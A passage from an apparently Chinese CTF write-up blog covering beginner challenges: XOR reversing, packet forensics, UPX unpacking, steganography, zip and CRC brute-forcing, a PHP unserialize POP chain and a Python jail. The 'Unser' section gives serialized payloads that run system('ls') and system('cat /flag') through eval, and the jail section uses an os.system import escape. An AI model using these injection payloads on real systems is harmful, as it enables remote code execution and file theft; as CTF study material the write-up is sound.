class="headerlink" title="xor 签到题"></a>xor 签到题</h2><p><font style="color:rgb(38, 38, 38);">1、先将xor放入IDA打开，f5看伪c代码</font><font style="color:rgb(38, 38, 38);"><br></font></p><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1713365748702-5b840a8c-f465-4c27-99ab-c21c974590da-181243.webp" alt="1713365748702-5b840a8c-f465-4c27-99ab-c21c974590da.png"></p><font style="color:rgb(38, 38, 38);">  </font><font style="color:rgb(38, 38, 38);">2、发现他是在跟5进行异或，u代表unsigned int,无符号整数 </font><font style="color:rgb(38, 38, 38);">  </font><font style="color:rgb(38, 38, 38);">3、随后写出python的异或代码，得出flag（这里好像不用考虑转义字符，只有一个\）</font><font style="color:rgb(38, 38, 38);">  </font><p><font style="color:rgba(89, 89, 89, 0.5);background-color:rgb(245, 245, 245);">Plain Text</font><font style="color:rgb(88, 90, 90);background-color:rgb(245, 245, 245);">复制代码</font></p><p><font style="color:rgb(108, 108, 108);background-color:rgb(250, 250, 250);">1</font></p><p><font style="color:rgb(108, 108, 108);background-color:rgb(250, 250, 250);">2</font></p><p><font style="color:rgb(108, 108, 108);background-color:rgb(250, 250, 250);">3</font></p><p><font style="color:rgb(108, 108, 108);background-color:rgb(250, 250, 250);">4</font></p><p><font style="color:rgb(108, 108, 108);background-color:rgb(250, 250, 250);">5</font></p><p><font style="color:rgb(38, 38, 38);background-color:rgb(250, 250, 250);">result&#x3D; ‘cidb~\5pZnk5rZ}56x’</font></p><p><font style="color:rgb(38, 38, 38);background-color:rgb(250, 250, 250);">flag&#x3D; ‘’</font></p><p><font style="color:rgb(38, 38, 38);background-color:rgb(250, 250, 250);">for i in range(len(result)):</font></p><p><font style="color:rgb(38, 38, 38);background-color:rgb(250, 250, 250);"> print(chr((ord(result[i]))^5),end&#x3D;’’)</font></p><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1713365851509-4bb923b0-04d9-4327-ad21-f0f010abe55d-493846.webp" alt="1713365851509-4bb923b0-04d9-4327-ad21-f0f010abe55d.png"></p><font style="color:rgb(38, 38, 38);">  </font><font style="color:rgb(38, 38, 38);">  </font>  <h2 id="ez-wireshark-1"><a href="#ez-wireshark-1" class="headerlink" title="ez_wireshark_1"></a><font style="color:rgb(33, 37, 41);">ez_wireshark_1</font></h2><p>1、先打开流量</p><p>2、直接明文搜索flag，得到</p><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1714028942516-194b5071-8eb6-43c1-af15-923a496ca719-422615.png" alt="1714028942516-194b5071-8eb6-43c1-af15-923a496ca719.png"></p><h2 id="ez-wireshark-2"><a href="#ez-wireshark-2" class="headerlink" title="ez_wireshark_2"></a><font style="color:rgb(33, 37, 41);">ez_wireshark_2</font></h2><p>1、流量里面发现有个被加密的flag.txt</p><p>2、跟踪数据流（注意这里不能直接复制，要查看原始数据，发现文件名开头的数据为504b0304），504b0506为结尾，后还有18个字节，本题刚好到最后一个字节为18个<img src="/./img/49277317_nTW8cUcHMkggc1Jt/1714030177427-04fba69e-5d8c-4084-9c5c-8aa9ab80cb7f-006484.png" alt="1714030177427-04fba69e-5d8c-4084-9c5c-8aa9ab80cb7f.png"></p><p>3、复制16进制数据放入010中生成zip文件，发现里面有加密的txt文件</p><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1714030324453-41846a08-4080-4afd-9ae0-ab68dfb5176b-510340.png" alt="1714030324453-41846a08-4080-4afd-9ae0-ab68dfb5176b.png"></p><p>4、用ARCHPR进行字典解密,得到密钥</p><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1714030531194-ce90d95b-6a39-488f-809e-097b9ef165b4-006195.png" alt="1714030531194-ce90d95b-6a39-488f-809e-097b9ef165b4.png"></p><p>5、输入密钥得到flag</p><h2 id="生产流量分析"><a href="#生产流量分析" class="headerlink" title="生产流量分析"></a><font style="color:rgb(33, 37, 41);">生产流量分析</font></h2><p>1、打开流量，根据modbus进行筛选</p><p>2、根据modbus数据流发现可疑数据</p><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1714031024584-a61d2452-9089-46e0-9b23-01c827883af2-797937.png" alt="1714031024584-a61d2452-9089-46e0-9b23-01c827883af2.png"></p><p>3、手搓下来，进行base32解码得到flag</p><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1714031054876-9476642a-7c11-4127-ae1a-a7e0be767381-329597.png" alt="1714031054876-9476642a-7c11-4127-ae1a-a7e0be767381.png"></p><h2 id="upx-and-base-64-change"><a href="#upx-and-base-64-change" class="headerlink" title="upx and base 64 change"></a>upx and base 64 change</h2><p>1、拖入010发现标识符被改，将其改成大写的UPX，在进行脱壳</p><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1715686280504-6a947ce0-265c-4e72-b74b-204d8d1b8586-004754.png" alt="1715686280504-6a947ce0-265c-4e72-b74b-204d8d1b8586.png"></p><p>2、放入exeinfo里面进行查壳，packed，32bit</p><p>用upx进行脱壳</p><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1715762228635-b627d676-ba94-483c-af87-8eb70cd7aa6e-201792.png" alt="1715762228635-b627d676-ba94-483c-af87-8eb70cd7aa6e.png"></p><p>再看一下壳已经消失</p><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1715345844887-2bbeb874-b95d-4b5c-85c2-4ac3adb21071-082163.png" alt="1715345844887-2bbeb874-b95d-4b5c-85c2-4ac3adb21071.png"></p><p>3、直接放32位IDA里面</p><p>F5可以先找找main函数，发现密文</p><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1715346268088-adbc470d-48be-4a6c-8fae-5a9a913746a1-600199.png" alt="1715346268088-adbc470d-48be-4a6c-8fae-5a9a913746a1.png"><br>4、题目提示是base64的变形题，shift F12找到密文和密钥</p><p>5、发现两个密钥进行尝试解密，提示词crypto</p><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1715346079436-69c3c2fd-4fad-44f7-aae6-569fd5418367-042339.png" alt="1715346079436-69c3c2fd-4fad-44f7-aae6-569fd5418367.png"></p><p>6、</p><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1715346210848-1d15cf5c-be3e-4b4f-8af5-e9521674dfd9-442488.png" alt="1715346210848-1d15cf5c-be3e-4b4f-8af5-e9521674dfd9.png"></p><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1715346143397-2ea98a29-39a0-4dfe-9565-a9eacb5ee7fa-070101.png" alt="1715346143397-2ea98a29-39a0-4dfe-9565-a9eacb5ee7fa.png"></p><p><img src="/./img/49277317_nTW8cUcHMkggc1Jt/1715346113846-7d0a03e2-5199-4bcc-85b4-4365da244c46-765658.png" alt="1715346113846-7d0a03e2-5199-4bcc-85b4-4365da244c46.png"></p><h2 id="Unser"><a href="#Unser" class="headerlink" title="Unser"></a>Unser</h2><?phphighlight_file(__FILE__);class pop {public $ClassObj;function __construct() {$this->ClassObj = new hello();}function __destruct() {$this->ClassObj->action();}}class hello {function action() {echo "hello pop ";}}class shell {public $data;function action() {eval($this->data);}}$a = new pop();@unserialize($_GET['s']);hello pop这里可以看到 ->eval($this->data); 这里可以看到action（）方法可以运行传入的data的代码由原运行结果可知反序列化之后先执行的是pop-> 所以要让ClassObj为shell类型->再将shell中data的值变为想要的代码O:3:"pop":1:{s:8:"ClassObj";O:5:"shell":1:{s:4:"data";s:13:"system("ls");";}} 先看看目录![1715761658742-691e8693-6a69-4125-ba0b-a11749231d08.png](./img/49277317_nTW8cUcHMkggc1Jt/1715761658742-691e8693-6a69-4125-ba0b-a11749231d08-944603.png)O:3:"pop":1:{s:8:"ClassObj";O:5:"shell":1:{s:4:"data";s:15:"system("ls /");";}} 再看看根目录 找到flag![1715761691802-127e6304-f286-4520-bd23-3a103507438d.png](./img/49277317_nTW8cUcHMkggc1Jt/1715761691802-127e6304-f286-4520-bd23-3a103507438d-353010.png)然后就是查看flag的内容了O:3:"pop":1:{s:8:"ClassObj";O:5:"shell":1:{s:4:"data";s:20:"system("cat /flag");";}}![1715761767491-2a916546-5286-4ec5-8a11-ad1625ab2343.png](./img/49277317_nTW8cUcHMkggc1Jt/1715761767491-2a916546-5286-4ec5-8a11-ad1625ab2343-015806.png)cat +文件路径即可> 更新: 2024-05-15 16:48:58  > 原文: <https://www.yuque.com/chaye-apqbl/vsc85q/fwfgcfdlfa6npehv>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2024/MOECTF/"/>
    <url>/2026/01/19/WP/2024/MOECTF/</url>
    
    <content type="html"><![CDATA[<h1 id="MOE-CTF"><a href="#MOE-CTF" class="headerlink" title="MOE CTF"></a>MOE CTF</h1><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>跟着pdf</p><p>输入&#x2F;bind 和个人识别码</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>把luo缺勤，别的签到就行</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726582446088-c516109e-c259-437b-a05a-00a61972ae09-473424.png" alt="1726582446088-c516109e-c259-437b-a05a-00a61972ae09.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726582511621-80c7d9b0-0e2b-4965-b935-38e27c4b1ebe-172102.png" alt="1726582511621-80c7d9b0-0e2b-4965-b935-38e27c4b1ebe.png"></p><h2 id="罗小黑战记"><a href="#罗小黑战记" class="headerlink" title="罗小黑战记"></a>罗小黑战记</h2><p>gif图直接逐帧分析就行</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1723263720470-a18bca4e-e6c6-4cde-9d5f-22a3d3fc54d4-325176.png" alt="1723263720470-a18bca4e-e6c6-4cde-9d5f-22a3d3fc54d4.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1723263812960-4375d98e-eaec-4b0d-8388-cdb6e7bd3945-900233.jpeg" alt="1723263812960-4375d98e-eaec-4b0d-8388-cdb6e7bd3945.jpeg"></p><p>moectf{y0uu6r3th3m0st3r1nth1sf13ld}</p><h2 id="ez-F5"><a href="#ez-F5" class="headerlink" title="ez_F5"></a>ez_F5</h2><p>看属性里面</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1726639123153-f607bbcb-9179-467c-808b-ba98ace133b8.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726639151147-1d0389d3-0803-422f-a348-88fe0c9aaf2c-539827.png" alt="1726639151147-1d0389d3-0803-422f-a348-88fe0c9aaf2c.png"></p><p>密码就是这个（当时真的无语住了）no_password</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726978557250-970f8d4b-9d35-47cf-9d84-70c6a1d1507b-750951.png" alt="1726978557250-970f8d4b-9d35-47cf-9d84-70c6a1d1507b.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726978655453-0bf723a7-13ec-46e9-b35d-866b7111591a-887923.png" alt="1726978655453-0bf723a7-13ec-46e9-b35d-866b7111591a.png"></p><h2 id="ez-Forensics"><a href="#ez-Forensics" class="headerlink" title="ez_Forensics"></a><strong>ez_Forensics</strong></h2><h2 id="杂项入门指北"><a href="#杂项入门指北" class="headerlink" title="杂项入门指北"></a>杂项入门指北</h2><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726637418339-703373ca-ffce-4a94-98d7-4d6c2d493009-205069.png" alt="1726637418339-703373ca-ffce-4a94-98d7-4d6c2d493009.png"></p><p>仔细观察，发现摩斯密码加密密文</p><p><font style="color:#DF2A3F;">注意中间要空格</font></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1726637693805-e4904747-5347-46f5-b155-e67b12f68e97-708215.png" alt="1726637693805-e4904747-5347-46f5-b155-e67b12f68e97.png"></p><h2 id="the-secret-of-snowball"><a href="#the-secret-of-snowball" class="headerlink" title="the_secret_of_snowball"></a><strong>the_secret_of_snowball</strong></h2><p>发现文件头错了</p><p>是ff d8</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727005047641-a0f88aca-bebe-4f0c-baae-01e53305da46-879049.png" alt="1727005047641-a0f88aca-bebe-4f0c-baae-01e53305da46.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727005062016-69d0aeef-0013-4495-b00a-0bb27cb21057-755683.png" alt="1727005062016-69d0aeef-0013-4495-b00a-0bb27cb21057.png"></p><p>moectf{Welc0me_t0_the_secret_life_0f_Misc!}</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727004799448-b18ae0e1-4e0c-4507-835c-cf4b033f6ab4-485058.png" alt="1727004799448-b18ae0e1-4e0c-4507-835c-cf4b033f6ab4.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727004808694-305e360e-e215-44e5-82e6-0c69e6cdbaf6-093273.png" alt="1727004808694-305e360e-e215-44e5-82e6-0c69e6cdbaf6.png"></p><p>提交发现错了。那应该不是</p><p>ret_life_0f_Misc!</p><h2 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h2><p>查看西安的桔子水晶酒店，发现北站市政府店附近有相似的建筑</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727006107345-4b21f235-badd-4ee6-86ac-0de65d13cee5-360151.png" alt="1727006107345-4b21f235-badd-4ee6-86ac-0de65d13cee5.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727006082085-43c0b664-5013-4b92-8dbe-36afe2919b2a-099170.png" alt="1727006082085-43c0b664-5013-4b92-8dbe-36afe2919b2a.png"></p><p>旋转视角</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727007269635-10bbaf2f-8682-48ee-86c3-c813f8ffbedf-791524.png" alt="1727007269635-10bbaf2f-8682-48ee-86c3-c813f8ffbedf.png"></p><p>发现两个贴在一起的幼儿园</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727007371120-b28d722d-e32d-4e1f-884c-859a8c178c97-714673.png" alt="1727007371120-b28d722d-e32d-4e1f-884c-859a8c178c97.png"></p><p>moectf{ji_di_bao_you_er_yuan}</p><h2 id="解不完的压缩包"><a href="#解不完的压缩包" class="headerlink" title="解不完的压缩包"></a>解不完的压缩包</h2><h3 id="这里附上爆破脚本（使用时记得修改初始设置）"><a href="#这里附上爆破脚本（使用时记得修改初始设置）" class="headerlink" title="这里附上爆破脚本（使用时记得修改初始设置）"></a>这里附上爆破脚本（使用时记得修改初始设置）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">import zipfile<br>import os<br><br># 初始设置：压缩包存储目录和初始zip文件名称<br>&quot;&quot;&quot;只要修改路径和需要解压的压缩包即可&quot;&quot;&quot;<br>zip_directory = r&#x27;D:\网站下载\taowa&#x27;<br>zip_name = &#x27;999.zip&#x27;<br><br># 循环解压嵌套的压缩包<br>while True:<br>    # 拼接当前的完整压缩包路径<br>    zip_path = os.path.join(zip_directory, zip_name)<br><br>    # 打开当前压缩包<br>    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as myzip:<br>        # 获取压缩包内文件列表<br>        file_list = myzip.namelist()<br><br>        # 判断是否有zip文件，提取文件名<br>        if not any(&#x27;.zip&#x27; in f for f in file_list):  # 如果文件列表中没有zip文件<br>            print(f&quot;Final unzipped location: &#123;zip_path&#125;&quot;)<br>            # 解压到目标目录<br>            myzip.extractall(os.path.join(zip_directory, &#x27;final&#x27;))<br>            break  # 终止循环<br>        else:<br>            # 如果文件列表中有zip文件，提取其中第一个zip文件<br>            for file_name in file_list:<br>                if file_name.endswith(&#x27;.zip&#x27;):<br>                    zip_name = file_name  # 更新zip_name为内部的zip文件<br>                    break<br>            # 解压当前的zip包到同级目录<br>            myzip.extractall(zip_directory)<br></code></pre></td></tr></table></figure><p>拿到1.zip</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727162769582-eb127e25-d6a5-46ac-b6e8-6133526e930f-165862.png" alt="1727162769582-eb127e25-d6a5-46ac-b6e8-6133526e930f.png"></p><p>发现解压要密码</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727162838854-3e32704b-17d0-4f2a-a939-e926b2803165-688395.png" alt="1727162838854-3e32704b-17d0-4f2a-a939-e926b2803165.png"></p><p>crcexp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs plain">from binascii import crc32<br>import string<br>import zipfile<br><br>dic = string.printable<br><br><br>def CrackCrc(crc):<br>    for i in dic:<br>        # print (i)<br>        for j in dic:<br>            s = i + j<br>            # print (crc32(bytes(s,&#x27;ascii&#x27;)) &amp; 0xffffffff)<br>            if crc == (crc32(bytes(s, &#x27;ascii&#x27;)) &amp; 0xffffffff):<br>                print(s)<br>                return<br><br><br>def getcrc32(fname):<br>    l = []<br>    file = fname<br>    f = zipfile.ZipFile(file, &#x27;r&#x27;)<br>    global fileList<br>    fileList = f.namelist()<br>    print(fileList)<br>    # print (type(fileList))<br>    for filename in fileList:<br>        Fileinfo = f.getinfo(filename)<br>        # print(Fileinfo)<br>        crc = Fileinfo.CRC<br>        # print (&#x27;crc&#x27;,crc)<br>        l.append(crc)<br>    return l<br><br><br>def main(filename=None):<br>    l = getcrc32(filename)<br>    # print(l)<br>    for i in range(len(l)):<br>        print(fileList[i], end=&#x27;的内容是:&#x27;)<br>        CrackCrc(l[i])<br><br><br>if __name__ == &quot;__main__&quot;:<br>    main(&#x27;cccccccrc.zip&#x27;)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727164516506-a5ae1627-40bb-4b70-83b6-683929ea5824-450801.png" alt="1727164516506-a5ae1627-40bb-4b70-83b6-683929ea5824.png"></p><p>密码*m:#P7j0</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727164624552-ae97851f-33a5-426e-a268-1cd29be4b1d5-033742.png" alt="1727164624552-ae97851f-33a5-426e-a268-1cd29be4b1d5.png"></p><h2 id="小小套娃"><a href="#小小套娃" class="headerlink" title="小小套娃"></a>小小套娃</h2><p>打开png发现文件出错</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727165047993-9d6d430b-742f-4b52-b17d-567c885edd00-997414.png" alt="1727165047993-9d6d430b-742f-4b52-b17d-567c885edd00.png"></p><p>爆破宽高</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727165248108-cbcf78a9-5410-44ca-a9d8-18c2665233dc-465227.png" alt="1727165248108-cbcf78a9-5410-44ca-a9d8-18c2665233dc.png"></p><p>拿到kali里面分离一下</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727167523537-9b568c67-fdf1-411a-8c7e-8d84d47d440d-554621.png" alt="1727167523537-9b568c67-fdf1-411a-8c7e-8d84d47d440d.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727167545963-2d5c13fe-2e85-49ad-bfb1-2a53dbf67907-113371.png" alt="1727167545963-2d5c13fe-2e85-49ad-bfb1-2a53dbf67907.png"></p><p>改成png文件，扫码得到first key 874jfy37yf37y7</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727167454933-dd678173-8c34-4d29-83da-b1cfee68e7f5-009744.png" alt="1727167454933-dd678173-8c34-4d29-83da-b1cfee68e7f5.png"></p><p>打开txt文件，发现显示长度与所见长度不合，是txt零宽度隐写</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727168251957-d17c4a2d-ff0e-411f-8e4e-a8acf25a58b1-030899.png" alt="1727168251957-d17c4a2d-ff0e-411f-8e4e-a8acf25a58b1.png"></p><p>放入kali里面</p><p>用vi +文件名 命令打开<img src="/./img/49277317_56sT9tyEdE0sMAIs/1727168212851-04de2979-eb96-48e1-8f5a-fd9449e6a4f0-729699.png" alt="1727168212851-04de2979-eb96-48e1-8f5a-fd9449e6a4f0.png"></p><p><font style="color:rgb(77, 77, 77);">很明显是零宽度字符</font><a href="https://so.csdn.net/so/search?q=%E9%9A%90%E5%86%99&spm=1001.2101.3001.7020">隐写</a><font style="color:rgb(77, 77, 77);">，在上面有找到4种零宽度字符，使用在线解密工具进行解密</font></p><p><a href="https://www.hanloth.cn/tool/zero-width-secret">零宽文本加解密工具 - 翰络云工具 (hanloth.cn)</a></p><p><font style="color:rgb(77, 77, 77);">有feff、200f、200e、200b、200c</font></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727174345421-21bd6add-c6c8-4528-9d50-03afd004a79c-434180.png" alt="1727174345421-21bd6add-c6c8-4528-9d50-03afd004a79c.png"></p><p>拿到密码，解一下佛教</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727174412482-f9b917d8-64a0-4aa9-a371-e0230afaf594-891848.png" alt="1727174412482-f9b917d8-64a0-4aa9-a371-e0230afaf594.png"></p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727174715148-c4347e29-2891-44be-94b6-7254ae174181-425474.png" alt="1727174715148-c4347e29-2891-44be-94b6-7254ae174181.png"></p><p><font style="color:rgb(77, 77, 77);"></font></p><h2 id="拼图羔手"><a href="#拼图羔手" class="headerlink" title="拼图羔手"></a>拼图羔手</h2><h2 id="moejail-lv1"><a href="#moejail-lv1" class="headerlink" title="moejail_lv1"></a><strong>moejail_lv1</strong></h2><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727254464153-46967c9b-23a3-4953-a2ca-2819de5dcfc5-785218.png" alt="1727254464153-46967c9b-23a3-4953-a2ca-2819de5dcfc5.png"></p><p>nc 127.0.0.1 63431</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727254450402-11e9d2da-7452-4dfd-a2a2-16eff5a39360-407837.png" alt="1727254450402-11e9d2da-7452-4dfd-a2a2-16eff5a39360.png"></p><p><strong>import</strong>(“os”).system(“ls”)</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727255021162-ef1e5b8d-6bca-4547-91bd-d18077a291d8-124562.png" alt="1727255021162-ef1e5b8d-6bca-4547-91bd-d18077a291d8.png"></p><p>看一下main函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs plain">import re<br>CONFIG_USE_FORK = True<br>MOTD = &quot;&quot;&quot;馃構 Welcome to the ez python jail!&quot;&quot;&quot;<br>def my_safe_eval(code):<br>    if re.match(r&quot;os|system|[\\\+]&quot;, code):<br>        return &quot;Hacked By Rx&quot;<br>    return eval(code)<br>def chall(input, print):<br>    code: str = input(&quot;Give me your payload:&quot;)<br>    if len(code) &gt; 100:<br>        print(&quot;Too long code, Sry!&quot;)<br>        return<br>    value = my_safe_eval(code)<br>    print(value)<br>def handle(input, print):<br>    import random<br>    import string<br>    print(<br>        &quot;HTTP/1.1 302 Found\r\nLocation: https://lug.ustc.edu.cn/planet/2019/09/how-to-use-nc/\r\nContent-Length: 0\r\n\r\n===HTTP REQUEST PREVENT===\x00\033c&quot;<br>    )<br>    try:<br>        print(MOTD)<br>        count = 0<br>        while True:<br>            captcha = &quot;&quot;.join(<br>                random.choices(string.ascii_uppercase + string.digits, k=6)<br>            )<br>            captcha2 = &quot;&quot;.join(<br>                random.choices(string.ascii_uppercase + string.digits, k=6)<br>            )<br>            if (<br>                input(<br>                    f&quot;馃え Are you robot? Please enter &#x27;&#123;captcha&#125;&#x27;+&#x27;&#123;captcha2&#125;&#x27;=? to continue: &quot;<br>                )<br>                .strip()<br>                .upper()<br>                != captcha + captcha2<br>            ):<br>                count += 1<br>                print(&quot;馃 Robot detected, try again&quot;)<br>                if count &gt; 5:<br>                    print(&quot;馃 Too many tries, blocked&quot;)<br>                    break<br>                continue<br>            count = 0<br>            try:<br>                chall(input, print)<br>            except Exception as e:<br>                print(f&quot;馃 Error: &#123;e&#125;&quot;)<br>    except Exception as e:<br>        print(<br>            f&quot;\033c ========== Unhandled Error! ==========\n馃ズ  We cannot recover from error: &#123;e&#125;\nChild process exited. Please reconnect or ask administrators for help if error persist&quot;<br>        )<br>def daemon_main():<br>    import os<br>    import socket<br>    import subprocess<br>    print(&quot;[Info] Server starting&quot;)<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    pwd = os.path.dirname(__file__)<br>    script = open(__file__, &quot;rb&quot;).read()<br>    self_fd = os.memfd_create(&quot;main&quot;)<br>    os.write(self_fd, script)<br>    os.lseek(self_fd, 0, os.SEEK_SET)<br>    os.chmod(self_fd, 0o444)<br>    try:<br>        sock.bind((&quot;0.0.0.0&quot;, 9999))<br>        sock.listen(1)<br>        while True:<br>            try:<br>                conn, addr = sock.accept()<br>                print(f&quot;[Info] Connected with &#123;addr&#125;&quot;)<br>                fd = conn.fileno()<br>                subprocess.Popen(<br>                    [<br>                        &quot;python&quot;,<br>                        &quot;/proc/self/fd/&#123;&#125;&quot;.format(self_fd),<br>                        &quot;fork&quot;,<br>                    ],<br>                    stdin=fd,<br>                    stdout=fd,<br>                    stderr=fd,<br>                    pass_fds=[self_fd],<br>                    cwd=pwd,<br>                    env=os.environ,<br>                )<br>            except Exception as e:<br>                print(f&quot;[Error] &#123;e&#125;&quot;)<br>    except KeyboardInterrupt:<br>        print(&quot;[Info] Server stopped&quot;)<br>    finally:<br>        sock.close()<br>        print(&quot;[Info] Server closed&quot;)<br>if __name__ == &quot;__main__&quot;:<br>    import sys<br>    if len(sys.argv) == 2 and sys.argv[1] == &quot;fork&quot;:<br>        del sys<br>        handle(input, print)<br>    else:<br>        daemon_main()<br></code></pre></td></tr></table></figure><p>发现在另一个wrapper.sh里面</p><p><img src="/./img/49277317_56sT9tyEdE0sMAIs/1727255452762-51d47fc3-0968-48b6-8d80-a9f25f62674f-842794.png" alt="1727255452762-51d47fc3-0968-48b6-8d80-a9f25f62674f.png"></p><p>发现不能超过100个字符</p><p><img 